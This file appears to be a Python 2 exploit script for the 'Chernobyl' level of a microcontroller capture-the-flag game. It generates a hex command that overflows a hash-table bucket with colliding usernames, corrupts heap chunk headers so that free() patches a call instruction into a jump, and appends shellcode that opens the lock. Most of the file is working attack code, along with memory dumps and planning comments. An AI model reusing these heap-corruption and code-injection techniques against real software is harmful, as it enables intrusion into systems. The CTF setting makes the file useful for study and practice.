# coding: cp437

import re
import sys
import subprocess

def clipboard(s):
    subprocess.Popen(['clip'], stdin=subprocess.PIPE).communicate(s)



def loadasm(filename):
    linere = re.compile('^([0-9a-f]{4}):  ([0-9a-f ]{4,14}) ')
    addrs = {}
    with open(filename,'rt') as inf:
        for line in inf.readlines():
            m = linere.match(line)
            if m:
                #print m.group(1), '/', m.group(2).strip(),'from', line
                addr = int(m.group(1), 16)
                words = [int(w[2:4] + w[:2],16) for w in m.group(2).strip().split(' ')]
                for i,w in enumerate(words):
                    addrs[addr + i*2] = w
    return addrs


mem = loadasm('chernobyl.s')




def hash(s):
    h = 0
    for c in s:
        c = (ord(c) + h) & 0xffff
        h = c
        h = (h << 5) & 0xffff
        h = (h - c) & 0xffff
    return h

def dmph(s):
    print s,'=>',hex(hash(s))[-4:]

#dmph('molen')
#dmph('aaaac')
#dmph('aaaaad')



def hh(c):
    return '%02x' % ord(c)
def hhhh(s):
    if len(s) == 2:
        return hh(s[0]) + hh(s[1])
    elif len(s) == 1:
        return hh(s[0])
    raise Error('wtf are you trying to pull')

def hexify(s):
    h=''
    for i in range(0,len(s),2):
        if not i==0:
            h += ' '
        h += hhhh(s[i:i+2])
    return h


#cmds = ['new u%d 1' %((i*2)+1) for i in range(71)]
#cmd = ';'.join(cmds)
#print cmd
#print hex(len(cmd)),'chars'

#; BROKEN.plan.v1:
#;   - add key user into bucket 1
#;   - add 7 users into bucket 0, overwriting pin of key user
#;       - user is 18B
#;       - offs of pin of key user is 96+16=112 bytes from start of bucket 0
#;       - so bytes 4&5 of user 7 in bucket 0 overlap pin of user 0 in bucket 1
#;       - also, bytes 7-15 of username 6 are now the name of key user - and need to match hash for bucket 1
#;   - login as key user

# � encodes as 0xf7
# �� is f7f7 , & 7fff is 77f7, is 30711 decimal

    
BITS = 3
BMSK = (1 << BITS) - 1

buckets = {}

def find_full_bucket():
    fullbucket = -1
    for i in xrange(1000):
        s = 'user%d' % i        # use eg. base64 usernames for shorter input
        hsh = hash(s)
        bucket = hsh & BMSK
        if bucket not in buckets:
            buckets[bucket] = []
        buckets[bucket].append(s)
        if len(buckets[bucket]) >= 5:
            fullbucket = bucket
            break
    for bucket,contents in buckets.iteritems():
        print str(bucket)+':', contents, '*' if bucket == fullbucket else '' 

    return fullbucket

def fill_bucket(bucket):
    if bucket not in buckets:
        buckets[bucket] = []

    for i in xrange(1000):
        s = 'uu%d' % i        # use eg. base64 usernames for shorter input
        hsh = hash(s)
        if (hash(s) & BMSK) == bucket:
            buckets[bucket].append( s )

        if len(buckets[bucket]) >= 5:
            break

fullbucket = 0
tgtbucket = (fullbucket + 1) % BMSK

fill_bucket( fullbucket )


def hhhhle(n):
    s = '%04x' % n
    return s[2:4] + s[:2]

def hexbuftostring(hb):
    s = ''
    assert len(hb) & 1 == 0
    for i in xrange(0,len(hb),2):
        hc = hb[i:i+2]
        s += chr(int(hc,16))
    return s

def assemblejmp(fromaddr, toaddr):
    instr = 0x3c00
    delta = toaddr - fromaddr
    assert abs( delta ) < (1 << 9), hex(abs(delta))
    assert (delta & 1) == 0
    deltaw = delta >> 1
    instr |= deltaw & 0x3ff
    return instr



opensesame = hexbuftostring( '324000ffb0121000' )


def trying_to_jump_to_input_buf():
    # new plan: change a call to point to code we have in our cmd
    # change call dest at 4bb8:
    #   4bb6:  b012 404d      call	#0x4d40 <getsn>

    # find user6name
    tgtinstaddr = 0x4752
    tgtbucketaddr = tgtinstaddr - 4
    firstbucketaddr = 0x503c
    bucketsize = 6 + 5 * 18
    nextbucketaddr = firstbucketaddr + (fullbucket+6) * bucketsize
    currinstr = mem[tgtinstaddr]
    assert currinstr & 1 == 0
    usermgmtlen = 122
    newjumptgt = 0x3dec + usermgmtlen
    newinstr = assemblejmp( tgtinstaddr, newjumptgt )
    assert (newinstr & 1) == 0
    print 'newinstr: %04x' % newinstr
    instrdelta = (((newinstr - 6) - currinstr) & 0xffff) | 1
    print 'reconstructed instr: %04x' % ((currinstr + 6 + (instrdelta & 0xfffe)) & 0xffff)
    hprefix = ''.join( [hhhhle(n) for n in (tgtbucketaddr, nextbucketaddr, instrdelta)] )
    print 'user6nameprefix:', hprefix

    # b4 v1
    #   4bb0:   3e40 5005 0f41 b012 404d 0b41 923c 7f90   >@P..A..@M.A.<.
    # after v1
    #   4bb0:   3e40 5005 0f41 3c53 ce42 0b41 923c 7f90   >@P..A<S.B.A.<.


# find user6name
tgtinstaddr = 0x4bc2
currinstr = mem[tgtinstaddr]
assert currinstr & 1 == 0

tgtheapinfo = tgtinstaddr - 4

firstbucketaddr = 0x503c
bucketsize = 6 + 5 * 18
nextbucketaddr = firstbucketaddr + (fullbucket+6) * bucketsize

usermgmtlen = 128

def if_we_could_jump_to_our_code():
    newjumptgt = 0x3dec + usermgmtlen

newjumptgt = 0x4cee
print 'new jump source: %04x, new jump dest: %04x' % (tgtinstaddr, newjumptgt)

print 'b free'
print 'b %04x; b %04x' % (tgtinstaddr, newjumptgt)

newinstr = assemblejmp( tgtinstaddr, newjumptgt )
assert (newinstr & 1) == 0
print 'newinstr: %04x' % newinstr

instrdelta = (((newinstr - 6) - currinstr) & 0xffff) | 1
print 'reconstructed instr: %04x' % ((currinstr + 6 + (instrdelta & 0xfffe)) & 0xffff)
hprefix = ''.join( [hhhhle(n) for n in (tgtheapinfo, nextbucketaddr, instrdelta)] )
print 'user6nameprefix:', hprefix


prefix = hexbuftostring( hprefix )
user6name = ''

for i in xrange(200):
    stgt = '%s%x' % (prefix,i)
    if (hash(stgt) & BMSK) == fullbucket:
        user6name = stgt
        break

print 'user6name', hexify(user6name)

usernames = buckets[fullbucket]

# first free() is bucket 0

# before adding user6
# 52c0:   0000 0000 0000 0000 0100 7573 6572 3239   ..........user29
# 52d0:   0000 0000 0000 0000 0000 0100 7c52 3c53   ............|R<S
# 52e0:   b500 0000 0000 0000 0000 0000 0000 0000   ................

usernames.append( user6name )

# after adding user6
# 52c0:   0000 0000 0000 0000 0100 7573 6572 3239   ..........user29
# 52d0:   0000 0000 0000 0000 0000 0100 be4b 3c53   .............K<S
# 52e0:   f911 3600 0000 0000 0000 0000 0100 0000   ..6.............

# # add padding names
i = 0x30
while len(usernames) < 12:
    padname = chr(i)
    i+=1
    if (hash(padname) & BMSK) == fullbucket or (hash(padname) & BMSK) == tgtbucket:
        continue
    usernames.append(padname)
    
cmd = ';'.join([ 'n>w %s 1' % u for u in usernames])

assert len(cmd) <= usermgmtlen
while len(cmd) < usermgmtlen:
    cmd += ';'

cmd += 'nn'
cmd += opensesame

#                                       v--  start of chunk just before being freed
# 5030:   0100 0100 0000 0100 0100 0100 2650 9c50   ............&P.P
# 5040:   b500 7573 6572 3300 0000 0000 0000 0000   ..user3.........
# 5050:   0000 0100 7573 6572 3136 0000 0000 0000   ....user16......
# 5060:   0000 0000 0100 7573 6572 3237 0000 0000   ......user27....
# 5070:   0000 0000 0000 0100 7573 6572 3330 0000   ........user30..
# 5080:   0000 0000 0000 0000 0100 7573 6572 3338   ..........user38
# 5090:   0000 0000 0000 0000 0000 0100 be4b 3c53   .............K<S
# 50a0:   f911 3400 0000 0000 0000 0000 0100 0000   ..4.............


# ; void free(void* pAlloc)
# ;   pChunk = (char*)pAlloc - 6
# ;   pChunk->info &= 0xfffe      // clear the "taken" bit
# ;   prevchunk [r14] = pChunk->pPrevChunk
# ;   if( !(prevchunk->info & 1) ) {  // if prev chunk was free
# ;       prevchunk->info = prevchunk->info + sizeof(chunkhdr) + pchunk->info
# ;       prvchunk->nextchunk = pChunk->nextchunk
# ;       nextchunk [r13] = pChunk->pNextChunk
# ;       nextchunk->pPrevChunk = prevchunk
# ;       pChunk = pChunk->pPrevChunk
# ;   }   // if prev chunk free
# ;
# ;   nextchunk = pChunk->pNextChunk
# ;   if( !(nextchunk->info & 1) ) {  // if next chunk is free
# ;       pChunk->info = nextchunk->info + pChunk->info + 6
# ;       pChunk->pNextChunk = nextchunk->pNextChunk
# ;       nextchunk->pPrevChunk = pChunk      // why?
# ;   }   // if next chunk free




def if_the_firmware_worked():
    # get user6name, needs to be xxxxxxTTTTTTTTT where user6name hashes to fullbucket, and TTTTTTTT hashes to tgtbucket
    user6name = ''
    for i in xrange(0xffffff):
        stgt = '%09x' % i
        if (hash(stgt) & BMSK) != tgtbucket:
            continue

        for j in xrange(0xffffff):
            sful = '%06x%s' % (j,stgt)
            if (hash(sful) & BMSK) == fullbucket:
                user6name = sful
                break
        break
    print 'user6name', user6name

    # get user7name, needs to go into fullbucket, needs bytes 4&5 to be 0xf7f7
    user7name = ''
    for i in xrange(0xffff):
        s = '%04x\xf7\xf7' % i
        bucket = hash(s) & BMSK 
        if bucket == fullbucket:
            # encodings are fucked, � should be F6 but ucorruption interprets as F7
            user7name = '%04x��' % i
            break

    print 'user7name =', user7name

    usernames = buckets[fullbucket]
    usernames.append( user6name )
    usernames.append( user7name )
    cmd = ';'.join([ 'new %s 1' % u for u in usernames])

    cmd = ('new %s 1;' % buckets[tgtbucket][0]) + cmd
    cmd += ';access %s 30711' % user6name[6:]

    ## ==> new u0 1;new u1 1;new u9 1;new u10 1;new u18 1;new u21 1;new 000007000000003 1;new 0004�� 1;access 000000003 30711
    ## fuuuuuuuuu this prints Access Granted but doesn't open the fscking door  T_T


#cmd = 'new m1 123;\x7f'

ocmd = cmd
cmd = hexify( cmd )
print 'COMMAND: }}' + cmd + '{{', len(ocmd), 'bytes'
clipboard(cmd)
